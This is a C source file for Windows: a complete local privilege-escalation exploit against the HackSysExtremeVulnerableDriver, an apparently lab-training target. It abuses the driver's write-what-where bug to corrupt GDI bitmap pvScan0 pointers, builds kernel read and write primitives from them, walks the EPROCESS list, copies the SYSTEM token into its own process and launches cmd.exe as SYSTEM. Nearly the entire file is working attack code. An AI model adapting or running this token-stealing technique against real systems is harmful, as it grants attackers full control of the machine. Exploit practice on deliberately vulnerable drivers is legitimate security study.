#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <string.h>

#define ProcessBasicInformation 0
#define BUFFER_SIZE             (0x64 * 0x64 * 4)
#define MODULE_SIZE             0x1000
#define NT_SUCCESS(status)      (status >= 0)
#define PID_OFFSET              0x2E8
#define TOKEN_OFFSET            0x358
#define FLINK_OFFSET            0x2F0
#define IO_CODE                 0x22200B

typedef struct _WRITE_WHAT_WHERE {
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

typedef struct {
    PVOID64 pKernelAddress; // 0x00
    USHORT wProcessId;      // 0x08
    USHORT wCount;          // 0x0a
    USHORT wUpper;          // 0x0c
    USHORT wType;           // 0x0e
    PVOID64 pUserAddress;   // 0x10
} GDICELL64, *PGDICELL64;   // sizeof = 0x18

typedef NTSTATUS (*pNtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
);

typedef NTSTATUS(*pNtQuerySystemInformation)(
    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength);

pNtQueryInformationProcess selfNtQueryInformationProcess = NULL;
pNtQuerySystemInformation selfNtQuerySystemInformation = NULL;
HMODULE hNtdll = NULL;
HBITMAP hBitmap[2] = { 0 };
GDICELL64 gdicell[2] = { 0 };
PVOID pvScan0[2] = { 0 };
CHAR buffer[BUFFER_SIZE] = {'J', 'i', 'm', 'p', 0};
ULONG64 moduleBase[MODULE_SIZE] = { 0 };
ULONG64 kernelBase = 0;

void ErrorOutput(const char* msg)
{
    printf(msg);
    printf("[-] Error Code: %d\n", GetLastError());
    exit(1);
}

void GetSurfaceAddr()
{
    for(int i = 0; i < 2; ++i)
    {
        hBitmap[i] = CreateBitmap(0x64, 0x64, 1, 32, &buffer);
        if (!hBitmap[i])
        {
            ErrorOutput("[-] Failed To Create Bitmap Object\n");
        }
    }
    HANDLE currProc = GetCurrentProcess();
    if (!currProc)
    {
        ErrorOutput("[-] Failed To Get Current Process\n");
    }
    hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll)
    {
        ErrorOutput("[-] Failed To Load Ntdll.dll\n");
    }
    selfNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!selfNtQueryInformationProcess)
    {
        ErrorOutput("[-] Failed To Get NtQueryInformationProcess Address\n");
    }
    printf("[+] NtQueryInformationProcess Address: 0x%I64x\n", (ULONG64)selfNtQueryInformationProcess);
    PROCESS_BASIC_INFORMATION procBasicInfo = { 0 };
    if (!NT_SUCCESS(selfNtQueryInformationProcess(currProc, ProcessBasicInformation, (PVOID)&procBasicInfo, sizeof(procBasicInfo))))
    {
        ErrorOutput("[-] Failed To Get Process PEB\n");
    }
    PGDICELL64 GdiSharedHandleTable = (PGDICELL64)(*(PULONG64)((PCHAR)procBasicInfo.PebBaseAddress + 0xF8));
    for (int i = 0; i < 2; ++i)
    {
        gdicell[i] = GdiSharedHandleTable[LOWORD(hBitmap[i])];
        pvScan0[i] = (PVOID)((PCHAR)gdicell[i].pKernelAddress + 0x50);
        printf("[+] Bitmap[%d] Handle: 0x%x\n", i, (DWORD)hBitmap[i]);
        printf("[+] pvScan0[%d] Address: 0x%I64x\n", i, (ULONG64)pvScan0[i]);
    }
}

void GetKernelBase()
{
    selfNtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (!selfNtQuerySystemInformation)
    {
        ErrorOutput("[-] Failed To Get NtQuerySystemInformation Address\n");
    }
    printf("[+] NtQuerySystemInformation Address: 0x%I64x\n", (ULONG64)selfNtQuerySystemInformation);
    // Get the base_address of ntoskrnl.exe in kernel
    DWORD length = 0;
    if (EnumDeviceDrivers((LPVOID)&moduleBase, sizeof(moduleBase), (LPDWORD)&length))
    {
        kernelBase = moduleBase[0];
        printf("[+] Kernel Base_Address: 0x%I64x\n", kernelBase);
        return;
    }
    ErrorOutput("[-] Failed To Get Kernel Base_Address\n");
}

// read src to dest
void ReadMemory(ULONG64 src, PULONG64 dest, ULONG64 len)
{
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = src;
    SetBitmapBits((ULONG64)((DWORD)hBitmap[0] & 0xFFFFFFFF), 0x8, buffer);
    memset(buffer, 0, BUFFER_SIZE);
    GetBitmapBits((ULONG64)((DWORD)hBitmap[1] & 0xFFFFFFFF), len, buffer);
    *dest = *(PULONG64)buffer;
}

// write src to dest
void WriteMemory(ULONG64 src, ULONG64 dest, ULONG64 len)
{
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = (ULONG64)dest;
    SetBitmapBits((ULONG64)((DWORD)hBitmap[0] & 0xFFFFFFFF), 0x8, buffer);
    memset(buffer, 0, BUFFER_SIZE);
    *(PULONG64)buffer = src;
    SetBitmapBits((ULONG64)((DWORD)hBitmap[1] & 0xFFFFFFFF), len, buffer);
}

void StealToken()
{
    // Get System process's address
    HMODULE hKernel = LoadLibraryA("ntoskrnl.exe");
    if (!hKernel)
    {
        ErrorOutput("[-] Failed To Load ntoskrnl.exe\n");
    }
    ULONG64 pEprocess = GetProcAddress(hKernel, "PsInitialSystemProcess");
    if (!pEprocess)
    {
        ErrorOutput("[-] Failed To Get EPROCESS Address\n");
    }
    ULONG64 PsInitialSystemProcess = pEprocess - (ULONG64)hKernel + kernelBase;
    FreeLibrary(hKernel);
    printf("[+] Get System's Address Pointer: 0x%I64x\n", PsInitialSystemProcess);
    ReadMemory(PsInitialSystemProcess, &pEprocess, 0x8);
    printf("[+] Get System's Address: 0x%I64x\n", pEprocess);

    // Find current process's address
     ULONG64 currProcPid = GetCurrentProcessId();
     LIST_ENTRY processLink = { 0 };
     ReadMemory(pEprocess + FLINK_OFFSET, &processLink, 0x8);
     printf("[+] Get Flink: 0x%I64x\n", (ULONG64)processLink.Flink);
     printf("[+] Current PID: 0x%I64x\n", currProcPid);
    // Loop the double linklist to find the current process
    while (1)
    {
        ULONG64 pTempEprocess = (ULONG64)processLink.Flink - FLINK_OFFSET;
        ULONG64 tempPid = 0;
        ReadMemory(pTempEprocess + PID_OFFSET, &tempPid, 0x8);
        if (tempPid == currProcPid)
        {
            printf("[+] Temp PID: 0x%I64x\n", tempPid);
            ULONG64 token = 0;
            ReadMemory(pEprocess + TOKEN_OFFSET, &token, 0x8);
            printf("[+] Token: 0x%I64x\n", token);
            WriteMemory(token, pTempEprocess + TOKEN_OFFSET, 0x8);
            break;
        }
        ReadMemory(pTempEprocess + FLINK_OFFSET, &processLink, 0x8);
        if (pEprocess == processLink.Flink)
        {
            printf("[-] Failed To Get The Current Process's EPROCESS\n");
            break;
        }
    }
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

void CommunicateWithDriver()
{
    HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        ErrorOutput("[-] Failed To Open The file\n");
    }
    else
    {
        printf("[+] Driver Handle: %d\n", (ULONG)hDevice);
    }
    WRITE_WHAT_WHERE www = { 0 };
    www.What = &pvScan0[1];
    www.Where = pvScan0[0];
    ULONG retLength = 0;
    BOOL ret = DeviceIoControl(hDevice,
        IO_CODE,
        &www,
        sizeof(WRITE_WHAT_WHERE),
        NULL,
        0,
        &retLength,
        NULL);
    if (!ret)
    {
        ErrorOutput("[-] Failed To Send Message\n");
    }
}

int main()
{
    GetSurfaceAddr();
    GetKernelBase();
    CommunicateWithDriver();
    StealToken();
    CreateCmd();
    return 0;
}